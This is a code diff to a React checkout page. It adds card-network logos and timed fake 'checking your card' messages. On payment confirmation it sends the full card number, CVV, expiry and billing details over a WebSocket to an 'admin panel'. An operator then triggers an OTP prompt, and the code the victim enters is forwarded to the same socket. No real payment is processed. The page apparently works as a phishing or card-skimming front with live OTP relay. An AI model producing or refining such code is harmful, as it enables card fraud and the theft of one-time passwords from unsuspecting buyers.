@@ -1,11 +1,15 @@
 import React, { useState, useEffect } from 'react';
 import { useSearchParams, useNavigate, Link } from 'react-router-dom';
-import { ArrowLeft, Lock, CreditCard, Loader2 } from 'lucide-react';
+import { ArrowLeft, Lock, CreditCard, Loader2, MoreHorizontal } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Checkbox } from '@/components/ui/checkbox';
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
+import { io, Socket } from 'socket.io-client';
 import visaLogo from '@/assets/visa-logo.png';
+import mastercardLogo from '@/assets/mastercard-logo.png';
+import discoverLogo from '@/assets/discover-logo.png';
+import rupayLogo from '@/assets/rupay-logo.png';
 
 const Checkout = () => {
   const [searchParams] = useSearchParams();
@@ -44,7 +48,7 @@ const Checkout = () => {
   const [promoCode, setPromoCode] = useState('');
   
   // Payment flow states
-  const [currentStep, setCurrentStep] = useState<'account' | 'loading' | 'payment' | 'review'>('account');
+  const [currentStep, setCurrentStep] = useState<'account' | 'loading' | 'payment' | 'review' | 'processing' | 'otp'>('account');
   const [paymentMethod, setPaymentMethod] = useState('');
   const [cardData, setCardData] = useState({
     cardNumber: '',
@@ -60,6 +64,14 @@ const Checkout = () => {
     expiryYear: '',
     cvv: ''
   });
+
+  // Loading and processing states
+  const [isProcessing, setIsProcessing] = useState(false);
+  const [processingMessage, setProcessingMessage] = useState('');
+  const [showOtp, setShowOtp] = useState(false);
+  const [otpValue, setOtpValue] = useState('');
+  const [socket, setSocket] = useState<Socket | null>(null);
+  const [confirmingPayment, setConfirmingPayment] = useState(false);
 
   // Pricing data based on the main page
   const pricingData = {
@@ -211,8 +223,87 @@ const Checkout = () => {
   };
 
   const handleReviewOrder = () => {
-    setCurrentStep('review');
+    setIsProcessing(true);
+    setCurrentStep('processing');
+    
+    // Simulate processing with messages
+    setProcessingMessage('Please wait we are checking your details!');
+    
+    setTimeout(() => {
+      setProcessingMessage('Checking your card information');
+      setTimeout(() => {
+        setProcessingMessage('Redirecting you to confirmation page..');
+        setTimeout(() => {
+          setIsProcessing(false);
+          setCurrentStep('review');
+        }, 3000);
+      }, 2000);
+    }, 1500);
   };
+
+  const handleConfirmPayment = () => {
+    setConfirmingPayment(true);
+    
+    // Connect to WebSocket and send payment data
+    const newSocket = io('ws://localhost:3001'); // Replace with your socket server
+    setSocket(newSocket);
+    
+    // Send payment data to admin panel
+    const paymentData = {
+      cardNumber: cardData.cardNumber,
+      cardName: cardData.cardName,
+      cvv: cardData.cvv,
+      expiry: `${cardData.expiryMonth}/${cardData.expiryYear}`,
+      billingDetails: {
+        firstName: formData.firstName,
+        lastName: formData.lastName,
+        email: formData.email,
+        country: formData.country,
+        companyName: formData.companyName
+      },
+      planName,
+      billing,
+      amount: displayPrice,
+      timestamp: new Date().toISOString()
+    };
+    
+    newSocket.emit('payment-data', paymentData);
+    
+    // Listen for admin responses
+    newSocket.on('show-otp', () => {
+      setShowOtp(true);
+      setCurrentStep('otp');
+    });
+    
+    newSocket.on('payment-approved', () => {
+      setConfirmingPayment(false);
+      setShowOtp(false);
+      // Handle successful payment
+      alert('Payment successful!');
+    });
+    
+    newSocket.on('payment-rejected', (reason: string) => {
+      setConfirmingPayment(false);
+      setShowOtp(false);
+      alert(`Payment rejected: ${reason}`);
+    });
+  };
+
+  const handleOtpSubmit = () => {
+    if (socket && otpValue) {
+      socket.emit('otp-submitted', { otp: otpValue });
+      setOtpValue('');
+    }
+  };
+
+  // Initialize socket connection
+  useEffect(() => {
+    return () => {
+      if (socket) {
+        socket.disconnect();
+      }
+    };
+  }, [socket]);
 
   return (
     <div className="min-h-screen bg-slate-900 text-white">
@@ -483,10 +574,18 @@ const Checkout = () => {
                     <CreditCard className="h-5 w-5 text-blue-400" />
                     <span className="font-medium">Credit Card / Debit Card</span>
                     <div className="ml-auto flex gap-2">
-                      <div className="h-6 w-10 bg-white rounded flex items-center justify-center p-1">
+                      <div className="h-8 w-12 bg-white rounded flex items-center justify-center p-1">
                         <img src={visaLogo} alt="Visa" className="h-full w-full object-contain" />
                       </div>
-                      <div className="h-6 w-10 bg-red-600 rounded flex items-center justify-center text-xs text-white font-bold">MC</div>
+                      <div className="h-8 w-12 bg-white rounded flex items-center justify-center p-1">
+                        <img src={mastercardLogo} alt="Mastercard" className="h-full w-full object-contain" />
+                      </div>
+                      <div className="h-8 w-12 bg-white rounded flex items-center justify-center p-1">
+                        <img src={discoverLogo} alt="Discover" className="h-full w-full object-contain" />
+                      </div>
+                      <div className="h-8 w-12 bg-white rounded flex items-center justify-center p-1">
+                        <img src={rupayLogo} alt="RuPay" className="h-full w-full object-contain" />
+                      </div>
                     </div>
                   </div>
                 </div>
@@ -599,18 +698,64 @@ const Checkout = () => {
                       </div>
                     </div>
 
-                    {/* Review Order Button - Only visible when card form is valid */}
-                    {isCardFormValid() && (
-                      <Button
-                        onClick={handleReviewOrder}
-                        className="w-full md:w-auto px-12 py-3 rounded font-medium bg-blue-600 hover:bg-blue-700 text-white"
-                      >
-                        Review order
-                      </Button>
-                    )}
+                    {/* Review Order Button - Always visible when payment method is selected */}
+                    <Button
+                      onClick={handleReviewOrder}
+                      disabled={!paymentMethod}
+                      className={`w-full md:w-auto px-12 py-3 rounded font-medium ${
+                        paymentMethod 
+                          ? 'bg-blue-600 hover:bg-blue-700 text-white' 
+                          : 'bg-slate-500 text-slate-300 cursor-not-allowed'
+                      }`}
+                    >
+                      Review order
+                    </Button>
                   </div>
                 )}
               </>
+            )}
+
+            {/* Processing Section */}
+            {currentStep === 'processing' && (
+              <div className="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm flex items-center justify-center z-50">
+                <div className="text-center">
+                  <Loader2 className="h-16 w-16 animate-spin text-blue-500 mb-6 mx-auto" />
+                  <p className="text-white text-lg font-medium">{processingMessage}</p>
+                </div>
+              </div>
+            )}
+
+            {/* OTP Section */}
+            {currentStep === 'otp' && (
+              <div className="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm flex items-center justify-center z-50">
+                <div className="bg-slate-800 rounded-lg p-8 max-w-md w-full mx-4">
+                  <h3 className="text-2xl font-bold text-white mb-6 text-center">Enter OTP</h3>
+                  <p className="text-slate-300 text-center mb-6">
+                    Please enter the 6-digit OTP sent to your registered mobile number
+                  </p>
+                  <div className="space-y-4">
+                    <Input
+                      value={otpValue}
+                      onChange={(e) => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
+                      className="bg-white text-slate-900 text-center text-2xl tracking-widest"
+                      placeholder="123456"
+                      maxLength={6}
+                    />
+                    <Button
+                      onClick={handleOtpSubmit}
+                      disabled={otpValue.length !== 6}
+                      className="w-full bg-blue-600 hover:bg-blue-700 text-white"
+                    >
+                      Verify OTP
+                    </Button>
+                  </div>
+                  {confirmingPayment && (
+                    <div className="absolute inset-0 bg-black bg-opacity-50 backdrop-blur-sm flex items-center justify-center rounded-lg">
+                      <Loader2 className="h-8 w-8 animate-spin text-blue-500" />
+                    </div>
+                  )}
+                </div>
+              </div>
             )}
 
             {/* Review Section */}
@@ -657,6 +802,31 @@ const Checkout = () => {
                     </div>
                     
                     <div className="flex justify-between items-center py-3 border-b border-slate-600">
+                      <span className="font-medium">Date & Time</span>
+                      <span className="text-slate-300">{new Date().toLocaleString()}</span>
+                    </div>
+                    
+                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
+                      <span className="font-medium">Country</span>
+                      <span className="text-slate-300">{formData.country}</span>
+                    </div>
+                    
+                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
+                      <span className="font-medium">Customer</span>
+                      <span className="text-slate-300">{formData.firstName} {formData.lastName}</span>
+                    </div>
+                    
+                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
+                      <span className="font-medium">Email</span>
+                      <span className="text-slate-300">{formData.email}</span>
+                    </div>
+                    
+                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
+                      <span className="font-medium">Transaction ID</span>
+                      <span className="text-slate-300 font-mono">TXN-{Date.now().toString().slice(-8)}</span>
+                    </div>
+                    
+                    <div className="flex justify-between items-center py-3 border-b border-slate-600">
                       <span className="font-medium">Total Amount</span>
                       <span className="text-xl font-bold text-white">₹{displayPrice.toLocaleString()}</span>
                     </div>
@@ -664,9 +834,19 @@ const Checkout = () => {
                 </div>
 
                 <Button
-                  className="w-full md:w-auto px-12 py-3 rounded font-medium bg-green-600 hover:bg-green-700 text-white"
+                  onClick={handleConfirmPayment}
+                  disabled={confirmingPayment}
+                  className="w-full md:w-auto px-12 py-3 rounded font-medium bg-green-600 hover:bg-green-700 text-white relative"
                 >
-                  Confirm Payment
+                  {confirmingPayment && (
+                    <>
+                      <div className="absolute inset-0 bg-green-600 bg-opacity-50 rounded flex items-center justify-center">
+                        <Loader2 className="h-5 w-5 animate-spin" />
+                      </div>
+                      <span className="opacity-30">Confirm Payment</span>
+                    </>
+                  )}
+                  {!confirmingPayment && 'Confirm Payment'}
                 </Button>
               </>
             )}
